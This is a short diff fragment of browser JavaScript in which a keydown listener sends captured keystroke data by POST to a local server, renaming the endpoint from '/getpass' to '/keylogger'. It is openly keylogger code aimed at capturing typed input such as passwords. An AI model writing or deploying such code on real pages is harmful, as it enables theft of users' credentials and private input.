@@ -9,7 +9,7 @@ document.addEventListener('keydown', (event) => {
     };
 
     // Send the keystroke data to the server
-    fetch('http://localhost:3000/getpass', {
+    fetch('http://localhost:3000/keylogger', {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json',
